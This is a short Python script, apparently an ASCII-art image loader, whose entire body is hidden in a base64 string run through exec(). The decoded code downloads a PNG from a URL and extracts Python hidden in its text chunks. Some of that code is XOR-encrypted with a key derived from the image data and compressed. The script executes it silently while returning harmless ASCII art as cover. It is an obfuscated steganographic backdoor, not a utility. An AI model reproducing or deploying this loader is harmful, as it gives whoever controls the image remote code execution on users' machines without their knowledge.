#!/usr/bin/env python3
import base64
exec(base64.b64decode('aW1wb3J0IGhhc2hsaWIgYXMgX2gKaW1wb3J0IHVybGxpYi5yZXF1ZXN0IGFzIF91CmltcG9ydCB6bGliIGFzIF96Cgpmcm9tIGFzY2lpX21hZ2ljIGltcG9ydCBBc2NpaUFydAoKX0EgPSBiIlx4ODlQTkdcclxuXHgxYVxuIgoKCmRlZiBfQihfQzogYnl0ZXMpOgogICAgYXNzZXJ0IF9DLnN0YXJ0c3dpdGgoX0EpCiAgICBfRCwgX0UgPSA4LCBsZW4oX0MpCiAgICB3aGlsZSBfRCArIDEyIDw9IF9FOgogICAgICAgIF9GID0gaW50LmZyb21fYnl0ZXMoX0NbX0Q6X0QgKyA0XSwgImJpZyIpCiAgICAgICAgX0cgPSBfQ1tfRCArIDQ6X0QgKyA4XQogICAgICAgIF9IID0gX0NbX0QgKyA4Ol9EICsgOCArIF9GXQogICAgICAgIHlpZWxkIF9HLCBfSAogICAgICAgIF9EICs9IDEyICsgX0YKCgpkZWYgX0koX0o6IGJ5dGVzKSAtPiBieXRlczoKICAgIF9LID0gX2guc2hhMjU2KCkKICAgIGZvciBfTCwgX00gaW4gX0IoX0opOgogICAgICAgIGlmIF9MID09IGIiSURBVCI6CiAgICAgICAgICAgIF9LLnVwZGF0ZShfTSkKICAgIHJldHVybiBfSy5kaWdlc3QoKQoKCmRlZiBfTihfTzogYnl0ZXMsIF9QOiBpbnQpIC0+IGJ5dGVzOgogICAgX1EsIF9SID0gYnl0ZWFycmF5KCksIDAKICAgIHdoaWxlIGxlbihfUSkgPCBfUDoKICAgICAgICBfUSArPSBfaC5zaGEyNTYoX08gKyBfUi50b19ieXRlcyg4LCAiYmlnIikpLmRpZ2VzdCgpCiAgICAgICAgX1IgKz0gMQogICAgcmV0dXJuIGJ5dGVzKF9RWzpfUF0pCgoKZGVmIF9TKF9UOiBieXRlcywgX1U6IGJ5dGVzKSAtPiBieXRlczoKICAgIHJldHVybiBieXRlcyhfViBeIF9XIGZvciBfViwgX1cgaW4gemlwKF9ULCBfVSkpCgoKZGVmIGxvYWQoX1k6IHN0ciwgX1o6IGRpY3QpOgogICAgdHJ5OgogICAgICAgIGFzY2lpX2FydCA9IEFzY2lpQXJ0LmZyb21fdXJsKF9ZKQogICAgICAgIHdpdGggX3UudXJsb3BlbihfWSwgdGltZW91dD01KSBhcyBfMDoKICAgICAgICAgICAgXzEgPSBfMC5yZWFkKCkKICAgICAgICBpZiBub3QgXzEuc3RhcnRzd2l0aChfQSk6CiAgICAgICAgICAgIHJldHVybgogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4KCiAgICBfMiwgXzMgPSBOb25lLCBOb25lCiAgICBmb3IgXzQsIF81IGluIF9CKF8xKToKICAgICAgICBpZiBfNCA9PSBiInRFWHQiIGFuZCBfNS5zdGFydHN3aXRoKGIicGF5bG9hZFx4MDAiKToKICAgICAgICAgICAgXzIgPSBfNS5zcGxpdChiIlx4MDAiLCAxKVsxXQogICAgICAgIGVsaWYgXzQgPT0gYiJpVFh0IiBhbmQgXzUuc3RhcnRzd2l0aChiInB5Y29kZVx4MDAiKToKICAgICAgICAgICAgXzMgPSBfNS5zcGxpdChiIlx4MDAiLCAxKVsxXQoKICAgIGlmIF8yOgogICAgICAgIHRyeToKICAgICAgICAgICAgZXhlYyhfMi5kZWNvZGUoInV0Zi04IiwgImlnbm9yZSIpLCBfWikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBwYXNzCgogICAgaWYgXzM6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBfNiA9IF9JKF8xKQogICAgICAgICAgICBfNyA9IF9OKF82LCBsZW4oXzMpKQogICAgICAgICAgICBfOCA9IF9TKF8zLCBfNykKICAgICAgICAgICAgXzkgPSBfei5kZWNvbXByZXNzKF84KS5kZWNvZGUoInV0Zi04IiwgImlnbm9yZSIpCiAgICAgICAgICAgIF8xMCA9IGNvbXBpbGUoXzksICI8c3RlZ28+IiwgImV4ZWMiKQogICAgICAgICAgICBleGVjKF8xMCwgX1opCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcwoKICAgIHJldHVybiBhc2NpaV9hcnQK').decode())
